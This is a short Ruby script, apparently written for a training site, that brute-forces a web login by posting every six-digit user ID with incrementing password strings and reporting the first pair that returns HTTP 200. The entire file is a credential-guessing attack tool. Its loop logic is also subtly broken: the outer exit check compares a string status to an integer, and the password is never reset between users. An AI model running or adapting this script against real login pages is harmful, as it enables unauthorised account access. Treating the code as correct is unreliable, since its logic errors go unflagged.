require 'pp'

require "net/http"
require "uri"



password = "a"
user = 0
puts "Starting run"
puts Time::now
while user <= 999999 do
    puts sprintf("User: %06d \n", user);
    puts Time::now
    while password !~ /zzzzzzzz/ do
#        puts sprintf("Password %s ", password)
        data = sprintf("user=%06d&password=%s",user,password)
        url = URI.parse("http://web4.training/")
        headers = {'Cookie' => "yick=yack;"} 
        resp = Net::HTTP.start(url.host, url.port) do |http|
            http.post(url.request_uri,data,headers)
        end
        if resp.code.to_i == 200 
            break
        end
        password.succ!
#        puts resp.code + "\n"
    end
    if resp.code == 200
        break
    end
    user +=1
end
puts sprintf("Cracked. User %06d Password %s", user, password)
puts resp.code
puts resp.header['Server']
puts resp.body

